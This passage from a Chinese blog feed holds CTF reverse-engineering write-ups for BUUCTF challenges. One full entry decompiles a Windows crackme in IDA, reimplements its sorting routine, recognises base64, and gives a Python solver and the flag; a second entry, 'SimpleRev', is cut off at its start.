punctuation">)</span>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">-=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>f2 <span class="token operator">+</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"emmm,you can't find flag 23333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> elf文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU逆向_刮开有奖</title>
      <link href="2021/04/05/BUU%E9%80%86%E5%90%91-%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/"/>
      <url>2021/04/05/BUU%E9%80%86%E5%90%91-%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="查pe"><a href="#查pe" class="headerlink" title="查pe"></a>查pe</h2><p>看是windows程序，然后就先打开试一下看看是什么，只显示了一个刮开有奖界面，并没有其他提示，先查一下可执行文件的信息</p><p><img src="/2021/04/05/BUU%E9%80%86%E5%90%91-%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/image-20210405144435362.png" alt="pe信息"></p><h2 id="丢进32位ida"><a href="#丢进32位ida" class="headerlink" title="丢进32位ida"></a>丢进32位ida</h2><p>主要是这个function</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">INT_PTR __stdcall <span class="token function">DialogFunc</span><span class="token punctuation">(</span>HWND hDlg<span class="token punctuation">,</span> UINT a2<span class="token punctuation">,</span> WPARAM a3<span class="token punctuation">,</span> LPARAM a4<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-20030h] BYREF</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-20028h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-20024h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-20020h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-2001Ch]</span>  <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment">// [esp+20h] [ebp-20018h]</span>  <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-20014h]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-20010h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment">// [esp+2Ch] [ebp-2000Ch]</span>  <span class="token keyword">int</span> v16<span class="token punctuation">;</span> <span class="token comment">// [esp+30h] [ebp-20008h]</span>  CHAR String<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+34h] [ebp-20004h] BYREF</span>  <span class="token keyword">char</span> v18<span class="token punctuation">[</span><span class="token number">65536</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+10034h] [ebp-10004h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">==</span> <span class="token number">272</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">!=</span> <span class="token number">273</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">==</span> <span class="token number">1001</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">GetDlgItemTextA</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> String<span class="token punctuation">,</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'Z'</span><span class="token punctuation">;</span>      v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'J'</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token string">'S'</span><span class="token punctuation">;</span>      v9 <span class="token operator">=</span> <span class="token string">'E'</span><span class="token punctuation">;</span>      v10 <span class="token operator">=</span> <span class="token string">'C'</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token punctuation">;</span>      v12 <span class="token operator">=</span> <span class="token string">'N'</span><span class="token punctuation">;</span>      v13 <span class="token operator">=</span> <span class="token string">'H'</span><span class="token punctuation">;</span>      v14 <span class="token operator">=</span> <span class="token string">'3'</span><span class="token punctuation">;</span>      v15 <span class="token operator">=</span> <span class="token string">'n'</span><span class="token punctuation">;</span>      v16 <span class="token operator">=</span> <span class="token string">'g'</span><span class="token punctuation">;</span>      <span class="token function">sub_4010F0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>v18<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xFFFFu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      v5 <span class="token operator">=</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">34</span>        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> v10        <span class="token operator">&amp;&amp;</span> <span class="token number">4</span> <span class="token operator">*</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">141</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">*</span> v8        <span class="token operator">&amp;&amp;</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v13 <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"ak1w"</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"V1Ax"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token string">"U g3t 1T!"</span><span class="token punctuation">,</span> <span class="token string">"@_@"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>_WORD<span class="token punctuation">)</span>a3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">EndDialog</span><span class="token punctuation">(</span>hDlg<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16<span class="token punctuation">)</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是对于这个函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">sub_4010F0</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后对该方法进行实现。</p><p>而v7-v17的地址空间又是连续的</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">-00020030 var_20030       dd ?-0002002C var_2002C       dd ?-00020028 var_20028       dd ?-00020024 var_20024       dd ?-00020020 var_20020       dd ?-0002001C var_2001C       dd ?-00020018 var_20018       dd ?-00020014 var_20014       dd ?-00020010 var_20010       dd ?-0002000C var_2000C       dd ?-00020008 var_20008       dd ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那<code>v7</code>就是<code>v7[10]</code>喽，所以<code>v7=ZJSEaNH3ng</code>，然后进入上面的<code>sub_4010F0((int)v7, 0, 10);</code>方法。把半汇编半c的代码转为c++</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">sub_4010F0</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ZJSECaNH3ng"</span><span class="token punctuation">;</span>    <span class="token function">sub_4010F0</span><span class="token punctuation">(</span>v7<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> v7 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token comment">//3CEHJNSZagn</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sub_4010F0</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> a1<span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// esi</span>    <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// ecx</span>    <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// edx</span>    result <span class="token operator">=</span> a3<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> a2<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> a3<span class="token punctuation">;</span> a2 <span class="token operator">=</span> i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>        v6 <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> a2 <span class="token operator">&lt;</span> result <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">do</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token operator">++</span>i<span class="token punctuation">;</span>                    a1<span class="token punctuation">[</span>v5<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> v6 <span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">++</span>i <span class="token operator">>=</span> result <span class="token punctuation">)</span>                            <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> result <span class="token punctuation">)</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>                    v5 <span class="token operator">=</span> i<span class="token punctuation">;</span>                    a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token operator">--</span>result<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> result <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>LABEL_13<span class="token operator">:</span>        a1<span class="token punctuation">[</span>result<span class="token punctuation">]</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>        <span class="token function">sub_4010F0</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        result <span class="token operator">=</span> a3<span class="token punctuation">;</span>        <span class="token operator">++</span>i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得<code>v7=3CEHJNSZagn</code>，<code>v7-v17</code>一共11个字符就是上面的了，然后继续向下，注意到有</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"ak1w"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>v5<span class="token punctuation">,</span> <span class="token string">"V1Ax"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个判定就是要满足<code>v4=ak1w</code>和<code>v5=V1Ax</code>，向上查看<code>v4与v5</code>的赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v4 <span class="token operator">=</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>v5 <span class="token operator">=</span> <span class="token function">sub_401000</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v18<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v18<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>并且在进行上面的这些赋值之前还有一些对v18的赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//v18长度为3</span><span class="token operator">-</span><span class="token number">00010004</span> var_10004       db <span class="token operator">?</span><span class="token operator">-</span><span class="token number">00010003</span> var_10003       db <span class="token operator">?</span><span class="token operator">-</span><span class="token number">00010002</span> var_10002       db <span class="token operator">?</span>v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v18<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v18<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>v18<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分两次赋值与进行<code>sub_401000()</code>函数操作，进入该函数发现有个字符数组<code>char byte_407830[]</code>的数据内容为</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00407830</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_407830<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00407830</span> byte_407830     db <span class="token number">41</span>h                  <span class="token punctuation">;</span> DATA XREF<span class="token operator">:</span> sub_401000<span class="token operator">+</span>C0↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00407831</span> aBcdefghijklmno db <span class="token string">'BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='</span><span class="token punctuation">,</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>大哥直接根据这一段字符数组判断出这是进行了base64加密，总的解密脚本为:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64v7 <span class="token operator">=</span> <span class="token string">"3CEHJNSZagn"</span>String <span class="token operator">=</span> <span class="token string">''</span>String <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">34</span><span class="token punctuation">)</span>String <span class="token operator">+=</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token number">4</span> <span class="token operator">*</span> i <span class="token operator">-</span> <span class="token number">141</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        String <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">/</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        String <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>String <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"V1Ax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>String <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token string">"ak1w"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>String<span class="token punctuation">)</span><span class="token comment"># UJWPb'WP1'b'jMp'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以flag为</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;UJWP1jMp&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU逆向SimpleRev</title>
      <link href="2021/04/05/BUU%E9%80%86%E5%90%91SimpleRev/"/>
      <url>2021/04/05/BUU%E9%80%86%E5%90%91SimpleRev/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ida打开"><a href="#ida打开" class="headerlink" title="ida打开"></a>ida打开</h2><p>ida打开测试一下应该是用64位的ida打开，先看一下main方法的c代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+Fh] [rbp-1h]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token 